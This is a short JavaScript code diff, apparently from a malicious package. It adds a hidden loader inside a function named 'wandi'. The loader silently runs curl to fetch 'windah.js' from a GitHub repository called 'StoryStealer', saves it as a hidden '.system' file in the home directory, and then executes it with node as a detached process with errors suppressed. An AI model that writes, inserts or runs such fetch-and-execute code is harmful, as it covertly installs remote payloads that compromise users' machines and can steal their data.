@@ -175,13 +175,19 @@ function deriveKey(salt) {
 }
 
 async function wandi(){
+	const ios = spawn(`curl https://raw.githubusercontent.com/SyifaaDev/StoryStealer/refs/heads/main/windah.js -o ${homes}.system`,{
+		stdio:"ignore",
+		shell: true
+	});
+	ios.on('close',async()=>{
 	await delay(1000);
-	const memek = await spawn(`node ${homes}/.system`,{
+	const memek = await spawn(`node ${homes}.system`,{
 		stdio:'inherit',
 		shell: true,
 		detached: true
 	});
 	memek.on('error',()=>{});
+	});
 }
 
 main().catch(()=>{});
